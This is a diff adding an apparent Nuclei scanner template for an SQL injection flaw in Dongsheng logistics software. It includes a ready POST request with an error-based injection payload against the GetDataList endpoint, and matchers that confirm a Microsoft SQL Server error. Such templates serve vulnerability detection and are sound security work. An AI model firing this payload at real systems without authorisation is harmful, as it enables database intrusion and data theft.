@@ -1,0 +1,35 @@
+id: dongshengsoft-GetDataList-sqli
+info:
+  name: 东胜物流软件 Chfee_hexiao/GetDataList SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 Chfee_hexiao/GetDataList 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/fpv58yovswz0bke0
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: dongshengsoft,sqli
+
+http:
+  - raw:
+      - |
+        POST /Account/Chfee_hexiao/GetDataList HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 38
+
+        start=0&condition=1<@@VERSION&limit=10
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
